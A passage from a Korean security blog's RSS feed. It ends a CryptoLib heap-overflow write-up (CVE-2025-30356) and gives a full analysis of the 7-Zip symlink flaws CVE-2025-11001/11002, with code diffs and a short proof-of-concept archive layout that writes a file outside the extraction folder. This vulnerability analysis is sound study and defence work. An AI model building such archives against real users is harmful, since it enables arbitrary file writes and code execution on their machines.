&#xD504;&#xB808;&#xC784;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;, ASan&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC624;&#xB958;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xBA70; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">65535</span> at <span class="hljs-number">0</span>x... thread T0#<span class="hljs-number">0</span> <span class="hljs-keyword">in</span> __asan_memcpy#<span class="hljs-number">1</span> <span class="hljs-keyword">in</span> Crypto_TC_ApplySecurity_Cam (crypto_tc.c:<span class="hljs-number">1161</span>)...SUMMARY: AddressSanitizer: heap-buffer-overflow</code></pre><p>&#xB610;&#xD55C;, GDB&#xB85C; &#xC2E4;&#xD589; &#xC2DC; &#xD799; &#xC190;&#xC0C1;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC911;&#xB2E8;(Abort)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs fortran">----- Crypto_TC_ApplySecurity <span class="hljs-keyword">END</span> -----malloc(): corrupted top <span class="hljs-built_in">size</span><span class="hljs-function"><span class="hljs-keyword">Program</span></span> received signal SIGABRT, Aborted<span class="hljs-number">.</span></code></pre><ul><li><strong>&#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xCEE4;&#xBC0B;:</strong> <code>01b7402cf07c3ee0ddf422de7c20a3d87fff8a87</code></li></ul><h3 id="3-Patch-Diffing"><a href="#3-Patch-Diffing" class="headerlink" title="3. Patch Diffing"></a>3. Patch Diffing</h3><p>Underflow &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD574; &#xAE38;&#xC774;&#xAC00; 0&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xD568;&#xC218;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xAC80;&#xC99D;&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">int16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (payload_calc &lt; <span class="hljs-number">0</span>){#ifdef TC_DEBUG    printf(<span class="hljs-string">&quot;Payload Calculation Underflow: %d\n&quot;</span>, payload_calc);#endif    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    <span class="hljs-keyword">return</span> status;}tf_payload_len = (uint16_t)payload_calc;</code></pre><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://nvd.nist.gov/vuln/detail/cve-2025-30356">https://nvd.nist.gov/vuln/detail/cve-2025-30356</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/CryptoLib/">CryptoLib</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-buffer-overflow/">Heap_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nasa/">Nasa</category>
      
      <category domain="https://hackyboiz.github.io/tags/cFS/">cFS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-11001, CVE-2025-11002: 7-Zip의 심볼릭링크 처리 취약점으로 인한 Arbitrary File Write / RCE 가능성</title>
      <link>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</link>
      <guid>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</guid>
      <pubDate>Sat, 18 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-25-949/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-949/">https://www.zerodayinitiative.com/advisories/ZDI-25-949/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7-Zip : &#x2264; 24.09</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-11001 / CVE-2025-11002&#xB294; 7-Zip&#xC758; ZIP &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;(&#xD2B9;&#xD788; Linux/WSL &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB41C; &#xB9C1;&#xD06C; &#xB370;&#xC774;&#xD130;)&#xB97C; &#xD30C;&#xC2F1;&#xB7;&#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC11C;&#xAC00; Windows &#xC808;&#xB300;&#xACBD;&#xB85C;<code>C:\...</code>&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB9C1;&#xD06C;&#xB97C; <strong>&#xB9AC;&#xB205;&#xC2A4;&#xC2DD; &#xAC80;&#xC0AC;</strong>&#xB85C; &#xC808;&#xB300; &#xC5EC;&#xBD80;&#xB97C; &#xC624;&#xD310;&#xD558;&#xBA74; <code>isRelative</code>&#xAC00; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xACE0;, &#xC774;&#xD6C4; &#x2018;relativize&#x2019; &#xACFC;&#xC815;&#xC5D0;&#xC11C; ZIP &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC811;&#xB450;&#xC0AC;&#xAC00; &#xBD99;&#xC73C;&#xBA74;&#xC11C; <code>IsSafePath</code> &#xAC80;&#xC0AC;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xC77C;&#xBD80; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xD750;&#xB984;&#xC740; &#xD56D;&#xBAA9; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;(&#xC608;: _item.IsDir)&#xB85C; &#xC778;&#xD574; &#xBE60;&#xC838;&#xB098;&#xAC00; &#xBC84;&#xB824; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; reparse &#xB370;&#xC774;&#xD130;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xCD94;&#xCD9C; &#xC911;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C; &#xC784;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff"><a href="#IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff" class="headerlink" title="IsSafePath&#xC640; CLinkLevelsInfo::Parse diff"></a>IsSafePath&#xC640; CLinkLevelsInfo::Parse diff</h3><pre><code class="hljs cpp">-<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+static bool IsSafePath(const UString &amp;path, bool isWSL) {   CLinkLevelsInfo levelsInfo;-  levelsInfo.Parse(path);+  levelsInfo.Parse(path, isWSL);   <span class="hljs-keyword">return</span> !levelsInfo.IsAbsolute       &amp;&amp; levelsInfo.LowLevel &gt;= <span class="hljs-number">0</span>       &amp;&amp; levelsInfo.FinalLevel &gt; <span class="hljs-number">0</span>; } +<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>;+<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+{+  <span class="hljs-keyword">return</span> IsSafePath(path, <span class="hljs-literal">false</span>); <span class="hljs-comment">// isWSL</span>+}+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CLinkLevelsInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path, <span class="hljs-keyword">bool</span> isWSL)</span></span><span class="hljs-function"> </span>{-  IsAbsolute = NName::IsAbsolutePath(path);-+  IsAbsolute = isWSL ?+      IS_PATH_SEPAR(path[<span class="hljs-number">0</span>]) :+      NName::IsAbsolutePath(path);   LowLevel = <span class="hljs-number">0</span>;   FinalLevel = <span class="hljs-number">0</span>; }</code></pre><p>7-Zip 24.09&#xC640; 25.00&#xC744; diff &#xD574;&#xBCF4;&#xBA74; &#xC774;&#xBC88; &#xB9B4;&#xB9AC;&#xC2A4;&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xBC84;&#xADF8;&#xAC00; &#xC218;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD328;&#xCE58;&#xB294; CPP/7zip/UI/Common/ArchiveExtractCallback.cpp&#xC758; zip &#xC555;&#xCD95; &#xD574;&#xC81C; &#xAD00;&#xB828; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xCF54;&#xB4DC;&#xAC00; &#xB9CE;&#xC774; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>IsSafePath</code> &#xD568;&#xC218;&#xAC00; &#xB208;&#xC5D0; &#xB744;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong>1) &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xC2DD;&#xBCC4;</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; _curSize &gt; <span class="hljs-number">0</span> &amp;&amp; _curSize &lt; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)){  <span class="hljs-keyword">if</span> (_fi.IsLinuxSymLink())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">true</span>;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_fi.IsReparse())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">false</span>;  }}</code></pre><p>&#xC2DC;&#xC791;&#xC810;&#xC740; CArchiveExtractCallback::GetStream()&#xC774;&#xBA70;, &#xC774; &#xD568;&#xC218;&#xB294; ReadLink&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>GetStream()</code>&#xC740; <code>CArchiveExtractCallback::GetExtractStream()</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xD30C;&#xC77C; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC73C;&#xBA74; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xD6C4; &#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2) reparse &#xBAA8;&#xB4DC; &#xBC0F; &#xB9C1;&#xD06C; &#xD30C;&#xC2F1;: CLinkInfo::Parse &#xD638;&#xCD9C;</strong></p><p>&#xCD94;&#xAC00; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE5C; &#xB4A4; <code>CArchiveExtractCallback::CloseReparseAndFile()</code>&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB9C1;&#xD06C;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xC5EC; &#xADF8;&#xAC83;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB824;&#xB294; &#xC704;&#xCE58;(&#xBAA9;&#xC801;&#xC9C0;)&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB824; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// &#xC815;&#xC758;</span><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">CLinkInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Byte *data, <span class="hljs-keyword">size_t</span> dataSize, <span class="hljs-keyword">bool</span> isLinuxData)</span></span>;</code></pre><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span> repraseMode = <span class="hljs-literal">false</span>;<span class="hljs-keyword">bool</span> needSetReparse = <span class="hljs-literal">false</span>;CLinkInfo linkInfo;<span class="hljs-keyword">if</span> (_bufPtrSeqOutStream){  repraseMode = <span class="hljs-literal">true</span>;  reparseSize = _bufPtrSeqOutStream_Spec-&gt;GetPos();  <span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; reparseSize == _outMemBuf.Size())  {    <span class="hljs-comment">// _is_SymLink_in_Data_Linux == true </span>    needSetReparse = linkInfo.Parse(_outMemBuf, reparseSize, _is_SymLink_in_Data_Linux);    <span class="hljs-keyword">if</span> (!needSetReparse)      res = SendMessageError_with_LastError(<span class="hljs-string">&quot;Incorrect reparse stream&quot;</span>, us2fs(_item.Path));  }}</code></pre><p>&#xD30C;&#xC11C;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC911;&#xC694;&#xD55C; &#xC18D;&#xC131;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Link path</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC758; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;)</li><li><strong>isRelative</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;)</li></ul><hr><h3 id="Issue-1"><a href="#Issue-1" class="headerlink" title="Issue #1"></a>Issue #1</h3><p>&#xB9AC;&#xB205;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC708;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; <code>C:\</code> &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB420; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span><span class="hljs-keyword">if</span> (repraseMode){  _curSize = reparseSize;  _curSize_Defined = <span class="hljs-literal">true</span>;    <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SUPPORT_LINKS</span>  <span class="hljs-keyword">if</span> (needSetReparse)  {    <span class="hljs-keyword">if</span> (!DeleteFileAlways(_diskFilePath))    {      RINOK(SendMessageError_with_LastError(<span class="hljs-string">&quot;can&apos;t delete file&quot;</span>, _diskFilePath))    }    {      <span class="hljs-keyword">bool</span> linkWasSet = <span class="hljs-literal">false</span>;      RINOK(SetFromLinkPath(_diskFilePath, linkInfo, linkWasSet))      <span class="hljs-keyword">if</span> (linkWasSet)        _isSymLinkCreated = linkInfo.IsSymLink();      <span class="hljs-keyword">else</span>        _needSetAttrib = <span class="hljs-literal">false</span>;    }  }  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>}<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></code></pre><p>&#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xB294; &#xC804;&#xCCB4; C:\ &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0;&#xB9CC;, &#xD30C;&#xC11C;&#xB294; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xD310;&#xB2E8;&#xC744; &#xB9AC;&#xB205;&#xC2A4; &#xC2A4;&#xD0C0;&#xC77C;&#xC758; &#xAC80;&#xC0AC;&#xB85C; &#xB530;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8; &#xB9C1;&#xD06C;&#xB97C; <strong>relative</strong>&#xB85C; &#xD45C;&#xAE30;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-2"><a href="#Issue-2" class="headerlink" title="Issue #2"></a>Issue #2</h3><p>SetFromLinkPath&#xB294; &#xC9C0;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB85C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB85C; &#xB9C1;&#xD06C;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xB294; &#xC548;&#xC804; &#xC7A5;&#xCE58;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (linkInfo.isRelative)  relatPath = GetDirPrefixOf(_item.Path);relatPath += linkInfo.linkPath;<span class="hljs-keyword">if</span> (!IsSafePath(relatPath)){  <span class="hljs-keyword">return</span> SendMessageError2(        <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>        <span class="hljs-string">&quot;Dangerous link path was ignored&quot;</span>,        us2fs(_item.Path),        us2fs(linkInfo.linkPath)); <span class="hljs-comment">// us2fs(relatPath)</span>}</code></pre><p>7-Zip&#xC740; &#xC0C8;&#xB85C; &#xCD94;&#xCD9C;&#xB418;&#xB294; zip &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xB9C1;&#xD06C;&#xAC00; &#xAC00;&#xB9AC;&#xD0AC; &#xC0C1;&#xB300; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD55C; &#xD6C4; <code>IsSafePath</code>&#xB85C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C1;&#xB300; &#xB9C1;&#xD06C;&#xC758; &#xACBD;&#xC6B0; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC704;&#xCE58;&#xD55C; zip &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xB9C1;&#xD06C; &#xACBD;&#xB85C; &#xC55E;&#xC5D0; &#xB367;&#xBD99;&#xC5EC; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-3"><a href="#Issue-3" class="headerlink" title="Issue #3"></a>Issue #3</h3><p>Issue 1&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB4EF;, &#xC0C1;&#xB300;&#xB9C1;&#xD06C;&#xB85C; &#xC798;&#xBABB; &#xD310;&#xB2E8;&#xB418;&#xC5B4; <code>isRelative == true</code> &#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; zip&#xC758; &#xB8E8;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC544;&#xBB34; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC548;&#xC5D0; &#xC788;&#xC73C;&#xBA74;, &#xADF8; &#xB0B4;&#xBD80; &#xACBD;&#xB85C;&#xAC00; &#xB9C1;&#xD06C; &#xC55E;&#xC5D0; &#xB354;&#xD574;&#xC838;&#xC11C; &#xAC80;&#xC0AC; &#xC2DC; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xAC80;&#xC0AC;&#xB294; <code>IsSafePath(&quot;some/directory/in/zip&quot; + &quot;C:\some\other\path&quot;)</code>&#xCC98;&#xB7FC; &#xD3C9;&#xAC00;&#xB418;&#xBA70;, &#xC774; &#xACBD;&#xC6B0; true&#xB85C; &#xD310;&#xC815;&#xB418;&#xC5B4; &#xD1B5;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-4"><a href="#Issue-4" class="headerlink" title="Issue #4"></a>Issue #4</h3><p>&#xC2E4;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB9C1;&#xD06C; &#xACBD;&#xB85C;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xADF8; &#xC774;&#xC804;&#xC5D0; &#xC8FC;&#xC5B4;&#xC9C4; &#x2018;item(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#x2019;&#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!_ntOptions.SymLinks_AllowDangerous.Val){  <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span>  <span class="hljs-keyword">if</span> (_item.IsDir) <span class="hljs-comment">// NOPE</span>  <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>  <span class="hljs-keyword">if</span> (linkInfo.isRelative)    {      CLinkLevelsInfo levelsInfo;      levelsInfo.Parse(linkInfo.linkPath);      <span class="hljs-keyword">if</span> (levelsInfo.FinalLevel &lt; <span class="hljs-number">1</span> || levelsInfo.IsAbsolute)      {        <span class="hljs-keyword">return</span> SendMessageError2(          <span class="hljs-number">0</span>, <span class="hljs-comment">// errorCode</span>          <span class="hljs-string">&quot;Dangerous symbolic link path was ignored&quot;</span>,          us2fs(_item.Path),          us2fs(linkInfo.linkPath));      }    }}</code></pre><p>&#xC774;&#xB54C;, &#xD56D;&#xBAA9;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC0AC;&#xC2E4;&#xC0C1; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC6B0;&#xD68C;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Issue-5"><a href="#Issue-5" class="headerlink" title="Issue #5"></a>Issue #5</h3><p>&#xC704; 4&#xAC00;&#xC9C0;&#xC758; Issue&#xB97C; &#xBAA8;&#xB450; &#xB9C8;&#xCE58;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// existPath -&gt; C:\some\other\path (symlink destination)</span><span class="hljs-comment">// data -&gt; path for symlink to be created </span><span class="hljs-comment">// Initializes reparse data for symlink creation</span><span class="hljs-keyword">if</span> (!FillLinkData(data, fs2us(existPath), !linkInfo.isJunction, linkInfo.isWSL))  <span class="hljs-keyword">return</span> SendMessageError(<span class="hljs-string">&quot;Cannot fill link data&quot;</span>, us2fs(_item.Path));<span class="hljs-comment">/// ...</span><span class="hljs-comment">// creates symlink</span><span class="hljs-keyword">if</span> (!NFile::NIO::SetReparseData(fullProcessedPath, _item.IsDir, data, (DWORD)data.Size())){  RINOK(SendMessageError_with_LastError(kCantCreateSymLink, fullProcessedPath))  <span class="hljs-keyword">return</span> S_OK;}</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="hljs cpp">data/link -&gt; (symlink) C:\Users\YOURUSERNAME\Desktop (&#xB610;&#xB294; &#xC6D0;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xC704;&#xCE58;)data/link -&gt; (Directory)data/link/calc.exe -&gt; (&#xCD94;&#xCD9C; &#xC2DC; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC4F0;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;)</code></pre><p>&#xC2EC;&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC555;&#xCD95;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xACBD;&#xC6B0; link(&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;)&#xAC00; &#xBA3C;&#xC800; &#xD480;&#xB824; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xD6C4; calc.exe&#xAC00; symlink&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC2E4;&#xC81C; &#xC704;&#xCE58;(&#xC608;: C:\Users\YOURUSERNAME\Desktop)&#xB85C; &#xD480;&#xB824; &#xC4F0;&#xC5EC;&#xC9D1;&#xB2C8;&#xB2E4;. 7-Zip&#xC774; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xC11C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xC4F0;&#xAC8C; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/pacbypass/CVE-2025-11001">https://github.com/pacbypass/CVE-2025-11001</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/7-zip/">7-zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/zip/">zip</category>
      
      <category domain="https://hackyboiz.github.io/tags/symlink/">symlink</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path-traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11001/">CVE-2025-11001</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-11002/">CVE-2025-11002</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The Quantum Threat to Classical Security (en)</title>
      <link>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/</guid>
